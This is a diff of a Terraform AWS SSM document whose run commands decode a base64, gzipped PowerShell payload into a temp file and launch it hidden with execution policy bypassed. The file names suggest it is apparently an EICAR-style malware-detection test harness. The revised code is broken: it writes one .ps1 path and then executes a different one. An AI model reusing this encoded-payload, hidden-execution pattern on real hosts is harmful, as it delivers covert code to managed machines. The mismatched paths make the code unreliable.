@@ -50,13 +50,28 @@ resource "aws_ssm_document" "this" {
                 "inputs": {
                     "timeoutSeconds": "${var.timeout}",
                     "runCommand": [
-                        "Set-Content -Path \"$env:TEMP\\payload_${var.tag}.gz\" -Value ([System.Convert]::FromBase64String('${var.base64_powershell_payload}'))",
-                        "$data = [System.IO.File]::ReadAllBytes(\"$env:TEMP\\payload_${var.tag}.gz\")",
-                        "$ms = New-Object System.IO.MemoryStream($data)",
-                        "$ms.Seek(0,0) | Out-Null",
-                        "$sr = New-Object System.IO.StreamReader((New-Object System.IO.Compression.GzipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)))",
-                        "$sr.ReadToEnd() | Set-Content -Path \"$env:TEMP\\payload_${var.tag}.ps1\"",
-                        "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"$env:TEMP\\payload_${var.tag}.ps1\"' -NoNewWindow -WindowStyle Hidden"
+                        "$outputPath = \"$env:TEMP\\payload_ssm_deploy_malware_eicar.gz\"",
+                        "$bytes = [System.Convert]::FromBase64String('${var.base64_powershell_payload}')",
+                        "[System.IO.File]::WriteAllBytes($outputPath, $bytes)",
+                        "$outputDecompressedPath = \"$env:TEMP\\payload_ssm_deploy_malware_eicar.ps1\"",
+                        "Add-Type -AssemblyName System.IO.Compression.FileSystem",
+                        "$gzipFile = $null",
+                        "$gzipStream = $null",
+                        "$decompressedFile = $null",
+                        "try {",
+                            "$gzipFile = [System.IO.File]::OpenRead($outputPath)",
+                            "$gzipStream = [System.IO.Compression.GZipStream]::new($gzipFile, [System.IO.Compression.CompressionMode]::Decompress)",
+                            "$decompressedFile = [System.IO.File]::Create($outputDecompressedPath)",
+                            "$gzipStream.CopyTo($decompressedFile)",
+                            "Write-Output \"Decompression successful! Decompressed file saved to $outputDecompressedPath\"",
+                            "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"$env:TEMP\\payload_${var.tag}.ps1\"' -NoNewWindow -WindowStyle Hidden",
+                        "} catch {",
+                            "Write-Error \"Failed to decompress the file: $_\"",
+                        "} finally {",
+                            "if ($gzipStream) { $gzipStream.Close(); $gzipStream.Dispose() }",
+                            "if ($gzipFile) { $gzipFile.Close(); $gzipFile.Dispose() }",
+                            "if ($decompressedFile) { $decompressedFile.Close(); $decompressedFile.Dispose() }",
+                        "}",
                     ]
                 }
             }
